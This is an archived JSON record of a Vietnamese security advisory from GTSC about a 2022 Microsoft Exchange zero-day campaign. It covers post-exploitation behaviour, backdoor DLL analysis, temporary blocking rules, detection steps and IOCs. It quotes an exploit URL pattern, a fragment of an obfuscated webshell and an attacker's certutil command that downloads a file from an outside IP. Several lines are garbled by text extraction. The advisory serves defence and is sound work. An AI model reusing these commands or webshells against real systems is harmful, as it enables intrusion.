{
    "id": "00f00f09-06dc-401b-99d1-c0d365a04eca",
    "created_at": "2023-01-12T15:00:29.741081Z",
    "updated_at": "2025-03-27T02:05:40.668433Z",
    "deleted_at": null,
    "sha1_hash": "8d873a86ceee8c68da342c31330769de587a5b51",
    "title": "2022-09-29 - Warning Campaign Attack Using Zero Day Vulnerability on Microsoft Exchange Server",
    "authors": "",
    "file_creation_date": "2022-10-02T12:27:08Z",
    "file_modification_date": "2022-10-02T12:27:08Z",
    "file_size": 2660776,
    "plain_text": "# Cảnh báo chiến dịch tấn công sử dụng lỗ hổng ZERO DAY trên Microsoft Exchange Server\n\n**[gteltsc.vn/blog/canh-bao-chien-dich-tan-cong-su-dung-lo-hong-zero-day-tren-microsoft-exchange-server-12714.html](https://www.gteltsc.vn/blog/canh-bao-chien-dich-tan-cong-su-dung-lo-hong-zero-day-tren-microsoft-exchange-server-12714.html)**\n\nSeptember 28, 2022\n\n**[English version here: https://gteltsc.vn/blog/warning-new-attack-campaign-utilized-a-new-0day-rce-vulnerability-on-microsoft-exchange-](https://gteltsc.vn/blog/warning-new-attack-campaign-utilized-a-new-0day-rce-vulnerability-on-microsoft-exchange-server-12715.html)**\nserver-12715.html\n\nKhoảng từ đầu tháng 08/2022, trong quá trình thực hiện giám sát an ninh mạng và xử lý sự cố, Trung tâm vận hành bảo mật GTSC SOC phát\nhiện một đơn vị trọng yếu bị tấn công an ninh mạng vào hệ thống ứng dụng Microsoft Exchange. Quá trình điều tra, đội ngũ chuyên gia\nBlueTeam xác định kẻ tấn công đã sử dụng một lỗ hổng bảo mật của Microsoft Exchange chưa từng được công bố - hay còn gọi là lỗ hổng 0day. GTSC SOC Team ngay lập tức đưa ra phương án ngăn chặn tạm thời. Song song, các chuyên gia RedTeam cũng bắt tay ngay vào việc\nnghiên cứu, debug lại mã nguồn ứng dụng Mail Exchange để tìm ra mã khai thác (exploit). Với lỗ hổng bảo mật Exchange trước đây, đội ngũ\nRedTeam cũng đã từng phân tích ra exploit trước khi có exploit được public trên thế giới (1-day exploit) nên việc hiểu luồng, cơ chế xử lý của\nhệ thống Email Exchange đã giúp giảm thời gian cho quá trình research. Ngay sau khi nghiên cứu ra exploit, GTSC đã submit lên ZDI để làm\nviệc với Microsoft nhằm nhanh chóng có bản vá.\n\nSau khi ZDI verify đã ghi nhận 2 bug liên quan đến exploit:\n\nTuy nhiên đến thời điểm hiện tại, GTSC ghi nhận thêm các đơn vị khác cũng đang gặp phải sự cố. Sau khi kiểm tra, GTSC xác nhận hệ thống\nbị tấn công qua lỗ hổng 0-day này. Để hỗ trợ cộng đồng ngăn chặn tạm thời trước khi có bản vá chính thức từ Microsoft, chúng tôi công bố bài\nviết này để cảnh báo tới các đơn vị có sử dụng hệ thống email Microsoft Exchange.\n\n## Thông tin lỗ hổng bảo mật\n\n- Đội ngũ Blueteam trong quá trình giám sát phát hiện được các request exploit dựa trên log IIS có định dạng giống như lỗ hổng\nProxyShell: autodiscover/autodiscover.json?@evil.com/<Exchange-backend-endpoint>&Email=autodiscover/autodiscover.json%3f@evil.com.\nĐồng thời kiểm tra các logs khác, nhận thấy kẻ tấn công thực hiện được các câu lệnh trên hệ thống. Kiểm tra version number trên máy chủ\nExchange bị tấn công nhận thấy máy chủ đã cài đặt bản cập nhật mới nhất tại thời điểm đó nên không thể có trường hợp khai thác bởi lỗ\nhổng Proxyshell -> xác nhận máy chủ bị khai thác bởi lỗ hổng 0-day RCE mới. Các thông tin này được Blueteam cung cấp lại cho Redteam,\ntừ đó đội ngũ Redteam của GTSC đã tiến hành nghiên cứu để trả lời cho các câu hỏi như tại sao các request lại giống với request của bug\nProxyShell?, luồng RCE được thực hiện như thế nào?\n\n\n-----\n\nết quả g ê cứu đã g úp G SC edtea t à cô g t a các sửdụg đườg dẫ t ê đểt uy cập tớ co po e t ở\nbackend và thực hiện RCE. Thông tin kỹ thuật chi tiết về lỗ hổng tại thời điểm này chúng tôi xin phép chưa công bố.\n\n## Các hành vi sau khai thác\n\nSau quá trình khai thác thành công lỗ hổng, chúng tôi ghi nhận các hành vi tấn công nhằm thu thập thông tin và tạo chỗ đứng trong hệ thống\ncủa nạn nhân. Nhóm tấn công cũng sử dụng các kỹ thuật khác nhau nhằm tạo backdoor trên hệ thống bị ảnh hưởng và thực hiện lateral\nmovement sang các máy chủ khác trong hệ thống.\n\n## Webshell\n\nChúng tôi phát hiện các webshell được drop xuống các máy chủ exchange. Các webshell chúng tôi thu thập được hầu hết được obfuscated.\nThông qua User-agent chúng tôi phát hiện attacker sử dụng Antsword (một opensource có tính năng hỗ trợ quản lý webshell).\n\n_<%@Page Language=\"Jscript\"%>_\n\n_<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('NTcyM'+'jk3O3'+'ZhciB'+'zYWZl'+''+'P'+'S'+char(8_\n_763)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('MQ=='))+char(51450/525)+''+''+char(0640-_\n_0462)+char(0x8c28/0x1cc)+char(0212100/01250)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Wg==_\n\nChúng tôi nghi ngờ các hành vi khai thác này xuất phát từ các nhóm tấn công Trung Quốc, dựa trên codepage trong webshell là 936, một\nbảng mã ký tự Microsoft cho tiếng Trung giản thể (simplified Chinese).\n\nMột đặc điểm đáng chú ý khác, bên cạnh việc drop các webshell mới hacker cũng thực hiện thay đổi nội dung trong file\nRedirSuiteServiceProxy.aspx thành nội dung webshell. RedirSuiteServiceProxy.aspx là một tên file hợp pháp sẵn có trong máy chủ Exchange\n\n**FileName** **Path**\n\nRedirSuiteServiceProxy.aspx C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\n\nXml.ashx C:\\inetpub\\wwwroot\\aspnet_client\n\npxh4HG1v.ashx C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\n\nTrong quá trình xử lý sự cố tại một khách hàng khác, GTSC ghi nhận nhóm tấn công có sử dụng một mẫu webshell khác\n\n**Filename: errorEE.aspx**\n\n**SHA256: be07bd9310d7a487ca2f49bcdaafb9513c0c8f99921fdf79a05eaba25b52d257**\n\n\n-----\n\n**e** ttps //g t ub co /a to oCoco/S a yS e\n\n## Command Execution\n\nBên cạnh các hành vi thu thập thông tin trên hệ thống, attacker thực hiện tải file và kiểm tra kết nối thông qua certutil có sẵn trên môi trường\nWindows\n\n“cmd\" /c cd /d \"c:\\\\PerfLogs\"&certutil.exe -urlcache -split -f http://206.188.196.77:8080/themes.aspx c:\\perflogs\\t&echo [S]&cd&echo [E]\n\n\"cmd\" /c cd /d \"c:\\\\PerfLogs\"&certutil.exe -urlcache -split -f https://httpbin.org/get c:\\test&echo [S]&cd&echo [E]\n\nỞ cuối của mỗi câu lệnh mà kẻ tấn công thực hiện đều có chuỗi echo [S]&cd&echo [E], một trong những dấu hiệu nhận biết của China\nChopper.\n\nNgoài ra, hacker cũng thực hiện inject DLL độc hại vào bộ nhớ, drop các file nghi ngờ lên các máy chủ bị tấn công, và thực thi các file này\nthông qua WMIC.\n\n## Suspicious File\n\nTrên các máy chủ, chúng tôi phát hiện các file nghi ngờ có định dạng exe và dll\n\n**FileName** **Path**\n\nDrSDKCaller.exe C:\\root\\DrSDKCaller.exe\n\nall.exe C:\\Users\\Public\\all.exe\n\ndump.dll C:\\Users\\Public\\dump.dll\n\nad.exe C:\\Users\\Public\\ad.exe\n\ngpg-error.exe C:\\PerfLogs\\gpg-error.exe\n\ncm.exe C:\\PerfLogs\\cm.exe\n\nmsado32.tlb C:\\Program Files\\Common Files\\system\\ado\\msado32.tlb\n\nTrong số các file nghi ngờ trên, dựa vào các câu lệnh được thực hiện trên máy chủ, chúng tôi nhận định các file all.exe, dump.dll có nhiệm vụ\ntrích xuất thông tin tài khoản trên hệ thống máy chủ. Sau các hành vi trích xuất thông tin tài khoản trên hệ thống, attacker sử dụng rar.exe để\nnén các file dump và copy ra webroot của máy chủ Exchange. Trong quá trình xử lý sự cố, các file trên đã không còn tồn tại trên hệ thống.\n\nFile cm.exe được drop xuống thư mục C:\\PerfLogs\\ là file cmd.exe\n\n## Malware Analysis\n\n**Thông tin DLL**\n\n**File name: Dll.dll**\n\n**Sha256:**\n\n074eb0e75bb2d8f59f1fd571a8c5b76f9c899834893da6f7591b68531f2b5d82\n\n45c8233236a69a081ee390d4faa253177180b2bd45d8ed08369e07429ffbe0a9\n\n9ceca98c2b24ee30d64184d9d2470f6f2509ed914dafb87604123057a14c57c0\n\n29b75f0db3006440651c6342dc3c0672210cfb339141c75e12f6c84d990931c3\n\nc8c907a67955bcdf07dd11d35f2a23498fb5ffe5c6b5d7f36870cf07da47bff2\n\n**Phân tích DLL**\n\nGTSC phân tích một mẫu cụ thể (074eb0e75bb2d8f59f1fd571a8c5b76f9c899834893da6f7591b68531f2b5d82) để mô tả hành vi của mã độc,\ncác mẫu DLL khác có nhiệm vụvà hành vi giống nhau, chỉkhác nhau vềcấu hình listener\n\n\n-----\n\ngồ a c ass **u** à ê t o g ỗc ass gọtớcác et od t ực ệ các ệ ụ ác au Cụt ể\n\nClass Run thực hiện tạo listener lắng nghe các kết nối tới port 443, đường dẫn https://*:443/ews/web/webconfig/.\n\nSau quá trình lắng nghe, mã độc tạo thread mới goi tới r. Method r thực hiện:\n\n-       Kiểm tra request nhận được có data trong body hay không. Nếu không có data đi kèm trong request gửi lên máy chủ, kết quả trả về\nlà 404.\n\n-       Ngược lại, nếu trong request có đi kèm data, DLL tiếp tục xử lý luồng bên trong nhánh IF:\n\nKiểm tra request nhận được có tồn tại \"RPDbgEsJF9o8S=\" hay không. Nếu có, gọi tới method i nằm trong class m để xử lý request nhận\nđược. Kết quả trả về từ Run.m.i sẽ được covert sang chuỗi base64. Kết quả trả về cho client theo format\n\n{\n\n\"result\":1,\n\n\"message\":\"base64(aes(result))\"\n\n}\n\n**Class m**\n\nMethod i thực hiện:\n\n-    Giải mã request nhận được bằng thuật toán AES với 16 bytes đầu tiên của request là giá trị IV, 16 bytes tiếp theo là giá trị key, các giá\ntrị sau đó là data\n\n-    Sau khi giải mã, lấy phần tử đầu tiên trong mảng làm flag để xử lý các case đã được định nghĩa\n\n\n-----\n\no  Case 0: Gọi tới method info. Method này có nhiệm vụ thu thập thông tin hệ thống. Các thông tin bao như kiến trúc hệ điều hành, phiên bản\nframework, phiên bản hệ điều hành, v.v....GTSC mô phỏng lại case 0 bằng hình ảnh bên dưới. Request gửi lên theo format 16 bytes đầu là giá\ntrị IV, 16 bytes tiếp theo là giá trị key, theo sau là flag để chỉ định option và phần còn lại là data.\n\n**base64 (IV | key | aes(flag|data))**\n\no  Case 1: Gọi tới method sc. Method này có nhiệm vụ cấp phát vùng nhớ để thực thi shellcode\n\n\n-----\n\no Case Gọtớ et od p à et od p ửý các dữệu được gă các bở ý tự **|** ưu ào ảg a ay3 ảg a ay3 sẽấy p ầ\ntử đầu tiên làm tham số cho method r, method r có nhiệm vụ thực thi command\n\no  Case 3: Gọi tới method ld. Method này có nhiệm vụ liệt kê thông tin thư mục và file theo format\n\nD|-|<Ngày tạo> |<Ngày chỉnh sửa> |<tên thư mục hoặc tên file>\n\no  Case 4: Gọi tới method wf. Method này có nhiệm vụ ghi file\n\no  Case 5: Gọi tới method rf. Method này có nhiệm vụ đọc file\n\n\n-----\n\no  Case 6: Tạo thư mục\n\no  Case 7: Xóa file hoặc thư mục\n\no  Case 8: Di chuyển File\n\no  Case 9: Set time cho file\n\no  Case 10: Nạp và thực thi C# bytecode nhận từ request.\n\n\n-----\n\nCác mẫu DLL khác có nhiệm vụ tương tự, chỉ khác nhau về cấu hình listener như sau:\n\nVictim 1:\n\nhttps://*:443/ews/web/webconfig/\n\nhttps://*:443/owa/auth/webcccsd/\n\nhttps://*:444/ews/auto/\n\nhttps://*:444/ews/web/api/\n\nVictim 2:\n\nhttp://*:80/owa/auth/Current/script/\n\nhttps://*:443/owa/auth/Current/script/\n\nChúng tôi cũng phát hiện DLL được inject vào memory của tiến trình svchost.exe. DLL thực hiện kết nối gửi nhận dữ liệu tới địa chỉ\n137[.]184[.]67[.]33 được config trong binary. Việc gửi nhận dữ liệu với C2 sử dụng thuật toán RC4, khóa sẽ được tạo trong thời gian chạy\n(runtime).\n\n## Các biện pháp ngăn chặn tạm thời\n\nQuá trình xử lý sự cố trực tiếp của GTSC ghi nhận có trên 1 đơn vị tổ chức bị là nạn nhân của chiến dịch tấn công khai thác lỗ hổng zero day.\nNgoài ra chúng tôi cũng lo ngại rằng có thể có nhiều tổ chức khác cũng đã bị khai thác nhưng chưa được phát hiện. Trong thời gian chờ đợi\nbản vá chính thức từ hãng, GTSC cung cấp biện pháp khắc phục tạm thời nhằm giảm thiểu việc tấn công khai thác lổ hổng bằng cách bổ\nsung rule chặn các request có dấu hiệu tấn công thông qua module URL Rewrite rule trên máy chủ IIS (Webserver)\n\n\n-----\n\no g utod sco e tạ o t d c ọ tab U e te c ọ equest oc g\n\n- Add thêm chuỗi “.*autodiscover\\.json.*\\@.*Powershell.*“ vào Pattern (URL Path):\n\n- Condition input: lựa chọn {REQUEST_URI}\n\n\n-----\n\n## Phát hiện tấn công\n\nNhằm kiểm tra hệ thống đã bị tấn công bởi lổ hỗng này, các đơn vị/tổ chức có thể thực hiện theo các cách thức sau:\n\n**Cách 1: Sử dụng powershell với câu lệnh sau: (Sử dụng powershell để thực hiện search trên toàn bộ folder log IIS mất khá nhiều thời gian)**\n\nGet-ChildItem -Recurse -Path <Path_IIS_Logs> -Filter \"*.log\" | Select-String -Pattern 'powershell.*autodiscover\\.json.*\\@.*200'\n\nCấu hình mặc định IIS log nằm tại đường dẫn \"%SystemDrive%\\inetpub\\logs\\LogFiles\"\n\n**Cách 2: Sử dụng công cụ do GTSC phát triển dựa trên dấu hiệu khai thác lỗ hổng, thời gian thực hiện search nhanh hơn so với việc sử dụng**\npowershell. Đường dẫn tải về công cụ: https://github.com/ncsgroupvn/NCSE0Scanner\n\nGiao diện chính của chương trình sẽ thực hiện rà quét trong thư mục log được cấu hình như trong hình dưới đây. Người dùng có thể lựa chọn\nsố thread mong muốn tùy theo cấu hình của máy chủ.\n\nChương trình sẽ tiến hành rà quét tự động và trả về kết quả.\n\n- Trường hợp phát hiện dấu hiệu tấn công thành công:\n\n\n-----\n\n- Trường hợp không phát hiện dấu hiệu tấn công, thông báo trả về như sau:\n\n- Tệp apt_matched.log: tổng hợp các request tấn công thành công.\n\n- Tệp apt_scan.log: tổng hợp thông tin trong quá trình scan.\n\nChúng tôi khuyến nghị các tổ chức/doanh nghiệp tại Việt Nam cũng như trên toàn thế giới đang sử dụng Microsoft Exchange Server tiến hành\nkiểm tra, rà soát, đồng thời áp dụng biện pháp khắc phục tạm thời bên trên sớm nhất có thể.\n\n## Indicators of Compromise (IOCs)\n\n**Webshell:**\n\n**File Name: pxh4HG1v.ashx**\n\n**Hash (SHA256): c838e77afe750d713e67ffeb4ec1b82ee9066cbe21f11181fd34429f70831ec1**\n\n**Path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\pxh4HG1v.ashx**\n\n**File Name: RedirSuiteServiceProxy.aspx**\n\n**Hash (SHA256): 65a002fe655dc1751add167cf00adf284c080ab2e97cd386881518d3a31d27f5**\n\n**Path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\RedirSuiteServiceProxy.aspx**\n\n**File Name:** **RedirSuiteServiceProxy.aspx**\n\n**Hash (SHA256): b5038f1912e7253c7747d2f0fa5310ee8319288f818392298fd92009926268ca**\n\n**Path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\RedirSuiteServiceProxy.aspx**\n\n\n-----\n\n**e** **a** **e** as (p G as à as có cù g ộdu g)\n\n**Hash (SHA256): c838e77afe750d713e67ffeb4ec1b82ee9066cbe21f11181fd34429f70831ec1**\n\n**Path: C:\\inetpub\\wwwroot\\aspnet_client\\Xml.ashx**\n\n**Filename: errorEE.aspx**\n\n**SHA256: be07bd9310d7a487ca2f49bcdaafb9513c0c8f99921fdf79a05eaba25b52d257**\n\n**Path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\errorEE.aspx**\n\n**DLL**\n\n**File name: Dll.dll**\n\n**SHA256:**\n\n074eb0e75bb2d8f59f1fd571a8c5b76f9c899834893da6f7591b68531f2b5d82\n\n45c8233236a69a081ee390d4faa253177180b2bd45d8ed08369e07429ffbe0a9\n\n9ceca98c2b24ee30d64184d9d2470f6f2509ed914dafb87604123057a14c57c0\n\n29b75f0db3006440651c6342dc3c0672210cfb339141c75e12f6c84d990931c3\n\nc8c907a67955bcdf07dd11d35f2a23498fb5ffe5c6b5d7f36870cf07da47bff2\n\n**File name: 180000000.dll (Dump từ tiến trình Svchost.exe)**\n\n**SHA256: 76a2f2644cb372f540e179ca2baa110b71de3370bb560aca65dcddbd7da3701e**\n\n**IP**\n\n125[.]212[.]220[.]48\n\n5[.]180[.]61[.]17\n\n47[.]242[.]39[.]92\n\n61[.]244[.]94[.]85\n\n86[.]48[.]6[.]69\n\n86[.]48[.]12[.]64\n\n94[.]140[.]8[.]48\n\n94[.]140[.]8[.]113\n\n103[.]9[.]76[.]208\n\n103[.]9[.]76[.]211\n\n104[.]244[.]79[.]6\n\n112[.]118[.]48[.]186\n\n122[.]155[.]174[.]188\n\n125[.]212[.]241[.]134\n\n185[.]220[.]101[.]182\n\n194[.]150[.]167[.]88\n\n212[.]119[.]34[.]11\n\n**URL:**\n\nhxxp://206[.]188[.]196[.]77:8080/themes.aspx\n\n**C2:**\n\n\n-----\n\n3 [ ] 8 [ ]6 [ ]33\n\n## Mitre ATT&CK Mapping\n\nTatic ID Name\n\nResource Development T1586.002 Compromise Accounts: Email Accounts\n\nExecution T1059.003 Command and Scripting Interpreter: Windows Command Shell\n\nExecution T1047 Windows Management Instrumentation\n\nPersistence T1505.003 Server Software Component: Web Shell\n\nDefense Evasion T1070.004 Indicator Removal on Host: File Deletion\n\nDefense Evasion T1036.005 Masquerading: Match Legitimate Name or Location\n\nDefense Evasion T1620 Reflective Code Loading\n\nCredential Access T1003.001 OS Credential Dumping: LSASS Memory\n\nDiscovery T1087 Account Discovery\n\nDiscovery T1083 File and Directory Discovery\n\nDiscovery T1057 Process Discovery\n\nDiscovery T1049 System Network Connections Discovery\n\nLateral Movement T1570 Lateral Tool Transfer\n\nCollection T1560.001 Archive Collected Data: Archive via Utility\n\n28/09/2022\n\n**GTSC SECURITY TEAM**\n\n\n-----",
    "language": "VI",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-29 - Warning Campaign Attack Using Zero Day Vulnerability on Microsoft Exchange Server.pdf"
    ],
    "report_names": [
        "2022-09-29 - Warning Campaign Attack Using Zero Day Vulnerability on Microsoft Exchange Server.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535629,
    "ts_updated_at": 1743041140,
    "ts_creation_date": 1664713628,
    "ts_modification_date": 1664713628,
    "files": {
        "pdf": "https://archive.orkl.eu/8d873a86ceee8c68da342c31330769de587a5b51.pdf",
        "text": "https://archive.orkl.eu/8d873a86ceee8c68da342c31330769de587a5b51.txt",
        "img": "https://archive.orkl.eu/8d873a86ceee8c68da342c31330769de587a5b51.jpg"
    }
}